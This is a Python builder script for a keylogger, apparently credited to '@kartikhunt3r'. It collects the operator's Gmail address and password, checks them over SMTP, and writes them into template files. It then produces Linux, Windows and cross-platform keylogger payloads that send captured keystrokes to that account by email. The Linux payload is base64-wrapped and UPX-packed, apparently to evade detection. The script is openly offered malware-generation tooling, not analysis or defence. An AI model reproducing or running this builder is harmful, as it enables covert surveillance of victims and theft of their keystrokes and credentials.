import shutil
import subprocess
import smtplib
import time

class colors:

    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


print(colors.OKGREEN,colors.BOLD,"""
 
░█████╗░██████╗░██████╗░██╗░██████╗██╗░░██╗██╗░░░██╗░█████╗░
██╔══██╗██╔══██╗██╔══██╗██║██╔════╝██║░░██║╚██╗░██╔╝██╔══██╗
███████║██║░░██║██████╔╝██║╚█████╗░███████║░╚████╔╝░███████║
██╔══██║██║░░██║██╔══██╗██║░╚═══██╗██╔══██║░░╚██╔╝░░██╔══██║
██║░░██║██████╔╝██║░░██║██║██████╔╝██║░░██║░░░██║░░░██║░░██║
╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝

██████████████████████████████████▀█████▀█████████████
█▄─█─▄█▄─▄▄─█▄─█─▄█▄─▄███─▄▄─█─▄▄▄▄█─▄▄▄▄█▄─▄▄─█▄─▄▄▀█
██─▄▀███─▄█▀██▄─▄███─██▀█─██─█─██▄─█─██▄─██─▄█▀██─▄─▄█
▀▄▄▀▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀

                                                @kartikhunt3r


""",colors.ENDC)



nmemail = input(colors.BOLD+colors.OKBLUE+"Enter your Gmail Address: "+colors.ENDC)
nmpass = input(colors.BOLD+colors.OKBLUE+"Enter your Password: "+colors.ENDC)
nmtime = int(input(colors.BOLD+colors.OKGREEN+"Enter the time delay for mails: "+colors.ENDC))
 #to loop until a correct password is aqquired


try: #Try to execute the code between try: and except:
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(nmemail,nmpass) #<-- SMTPAuthenicationError is raised here.
    #Now Python will look for an Except clause that handles that specific error, skipping over the rest of the Try clause. 
    #Which is printing that we are logged in, which we aren't!

    print("verifying Email ...")

except smtplib.SMTPAuthenticationError:     
    print("Error! Wrong gmail or password.")
    exit()

original = r'lib/lib.py'
target = r'linux_exploit.py'
original2 = r'lib/lib.sh'
target2 = r'linux_exploit.sh'
original3 = r'lib/lib.bat'
target3 = r'windows_exploit.bat'

shutil.copyfile(original, target)
shutil.copyfile(original2, target2)
shutil.copyfile(original3, target3)

# creating a variable and storing the text
# that we want to search
search_text = "exampleLKJH@gmail.com"
search_text2= "passwordVerySecure"
search_text3= "238"

# creating a variable and storing the text
# that we want to add
replace_text = str(nmemail)
replace_text2 = str(nmpass)
replace_text3 = str(nmtime)
# Opening our text file in read only
# mode using the open() function
with open(r'linux_exploit.py', 'r') as file:

	# Reading the content of the file
	# using the read() function and storing
	# them in a new variable
	data = file.read()

	# Searching and replacing the text
	# using the replace() function
	data = data.replace(search_text, replace_text)
    
# Opening our text file in write only
# mode to write the replaced content
with open(r'linux_exploit.py', 'w') as file:

	# Writing the replaced data in our
	# text file
	file.write(data)

file.close()
# Printing Text replaced
print(colors.BOLD,colors.OKGREEN,"[+] email verified [+]")




with open(r'linux_exploit.py', 'r') as file:

	# Reading the content of the file
	# using the read() function and storing
	# them in a new variable
	data2 = file.read()

	# Searching and replacing the text
	# using the replace() function
	data2 = data2.replace(search_text2, replace_text2)
    
# Opening our text file in write only
# mode to write the replaced content
with open(r'linux_exploit.py', 'w') as file:

	# Writing the replaced data in our
	# text file
	file.write(data2)

file.close()

# Printing Text replaced
print(colors.BOLD,colors.OKGREEN,"[+] pass verified [+]")
print(colors.BOLD,colors.WARNING,"Please allow less secure apps to your gmail for proper use of this tool.")





with open(r'linux_exploit.py', 'r') as file:

	# Reading the content of the file
	# using the read() function and storing
	# them in a new variable
	data3 = file.read()

	# Searching and replacing the text
	# using the replace() function
	data3 = data3.replace(search_text3, replace_text3)
    
# Opening our text file in write only
# mode to write the replaced content
with open(r'linux_exploit.py', 'w') as file:

	# Writing the replaced data in our
	# text file
	file.write(data3)

file.close()



#############-------------Linux Exploit--------------------###############

with open(r'linux_exploit.sh', 'r') as file:

	# Reading the content of the file
	# using the read() function and storing
	# them in a new variable
	data = file.read()

	# Searching and replacing the text
	# using the replace() function
	data = data.replace(search_text, replace_text)
    
# Opening our text file in write only
# mode to write the replaced content
with open(r'linux_exploit.sh', 'w') as file:

	# Writing the replaced data in our
	# text file
	file.write(data)

file.close()
# Printing Text replaced
print(colors.BOLD,colors.OKGREEN,"[+] Creating Linux Exploit [+]")




with open(r'linux_exploit.sh', 'r') as file:

	# Reading the content of the file
	# using the read() function and storing
	# them in a new variable
	data2 = file.read()

	# Searching and replacing the text
	# using the replace() function
	data2 = data2.replace(search_text2, replace_text2)
    
# Opening our text file in write only
# mode to write the replaced content
with open(r'linux_exploit.sh', 'w') as file:

	# Writing the replaced data in our
	# text file
	file.write(data2)

file.close()

# Printing Text replaced
print(colors.BOLD,colors.OKGREEN,"[+] Bash File Generated [+]")
print(colors.BOLD,colors.WARNING,"Please allow less secure apps to your gmail for proper use of this tool.")





with open(r'linux_exploit.sh', 'r') as file:

	# Reading the content of the file
	# using the read() function and storing
	# them in a new variable
	data3 = file.read()

	# Searching and replacing the text
	# using the replace() function
	data3 = data3.replace(search_text3, replace_text3)
    
# Opening our text file in write only
# mode to write the replaced content
with open(r'linux_exploit.sh', 'w') as file:

	# Writing the replaced data in our
	# text file
	file.write(data3)

file.close()




#############-------------Windows Exploit--------------------###############

with open(r'windows_exploit.bat', 'r') as file:

	# Reading the content of the file
	# using the read() function and storing
	# them in a new variable
	data = file.read()

	# Searching and replacing the text
	# using the replace() function
	data = data.replace(search_text, replace_text)
    
# Opening our text file in write only
# mode to write the replaced content
with open(r'windows_exploit.bat', 'w') as file:

	# Writing the replaced data in our
	# text file
	file.write(data)

file.close()
# Printing Text replaced
print(colors.BOLD,colors.OKGREEN,"[+] Creating Windows Exploit [+]")




with open(r'windows_exploit.bat', 'r') as file:

	# Reading the content of the file
	# using the read() function and storing
	# them in a new variable
	data2 = file.read()

	# Searching and replacing the text
	# using the replace() function
	data2 = data2.replace(search_text2, replace_text2)
    
# Opening our text file in write only
# mode to write the replaced content
with open(r'windows_exploit.bat', 'w') as file:

	# Writing the replaced data in our
	# text file
	file.write(data2)

file.close()

# Printing Text replaced
print(colors.BOLD,colors.OKGREEN,"[+] Batch File Generated [+]")
print(colors.BOLD,colors.WARNING,"Please allow less secure apps to your gmail for proper use of this tool.")





with open(r'windows_exploit.bat', 'r') as file:

	# Reading the content of the file
	# using the read() function and storing
	# them in a new variable
	data3 = file.read()

	# Searching and replacing the text
	# using the replace() function
	data3 = data3.replace(search_text3, replace_text3)
    
# Opening our text file in write only
# mode to write the replaced content
with open(r'windows_exploit.bat', 'w') as file:

	# Writing the replaced data in our
	# text file
	file.write(data3)

file.close()






# Printing Text replaced
print(colors.BOLD,colors.OKGREEN,"setting up mail duration...")
print(colors.BOLD,colors.OKGREEN,"[+]DONE [+]")
print(colors.BOLD,colors.OKGREEN,"Generating Payload ...(this may take few minutes) ...")
anything = '"echo'
anything2 = ' sh" >> '
subprocess.call("apt install upx",shell=True)
subprocess.call(["mkdir", "keylogger"])
subprocess.call("echo '#!/usr/bin/env bash' > keylogger/Keylogger_For_Linux", shell=True)
subprocess.call("echo "+anything+" '$(base64 linux_exploit.sh)' | base64 -d |"+anything2+"keylogger/Keylogger_For_Linux",shell=True)
subprocess.call("python -OO -m py_compile linux_exploit.py",shell=True)
subprocess.call("cp __pycache__/linux_exploit.cpython-310.opt-2.pyc keylogger/keylogger_for_all_OS.py",shell=True)
subprocess.call("cp windows_exploit.bat keylogger/keylogger_for_windows.bat",shell=True)
subprocess.call("rm -r __pycache__",shell=True)
subprocess.call(["rm", "linux_exploit.py"])
subprocess.call(["rm", "linux_exploit.sh"])
subprocess.call(["rm", "windows_exploit.bat"])
time.sleep(2)
subprocess.call("chmod 777 keylogger",shell=True)
subprocess.call("chmod +x keylogger/Keylogger_For_Linux",shell=True)
subprocess.call("chmod +x keylogger/keylogger_for_all_OS.py",shell=True)
subprocess.call("chmod +x keylogger/keylogger_for_windows.bat",shell=True)
subprocess.call("upx keylogger/Keylogger_For_Linux",shell=True)
print(colors.BOLD,colors.OKGREEN,"[+] Keylogger Generated Successfully[+]")
